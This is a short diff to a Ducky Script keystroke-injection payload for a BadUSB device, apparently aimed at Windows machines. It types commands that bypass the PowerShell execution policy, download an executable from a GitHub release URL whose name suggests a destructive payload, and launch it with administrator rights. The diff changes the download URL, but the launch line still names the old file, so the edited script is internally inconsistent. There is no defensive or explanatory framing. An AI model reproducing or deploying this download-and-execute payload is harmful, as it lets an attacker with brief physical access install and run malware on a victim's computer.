@@ -1,4 +1,3 @@
-REM This Script Was Made By Social :3
 DELAY 200
 GUI r
 DELAY 200
@@ -15,7 +14,7 @@ DELAY 200
 STRING Set-ExecutionPolicy Bypass -Scope Process -Force;
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://github.com/Socialfrrr/Socials-database/releases/download/bootfucker/Bai.Bai.exe" -OutFile "$env:USERPROFILE\Downloads\Bai.Bai.exe"
+STRING Invoke-WebRequest -Uri "https://github.com/mastrpcs/cdn/scripts/req/byefucker.exe" -OutFile "$env:USERPROFILE\Downloads\byefucker.exe"
 ENTER
 DELAY 800
 STRING Start-Process "$env:USERPROFILE\Downloads\Bai.Bai.exe" -Verb RunAs
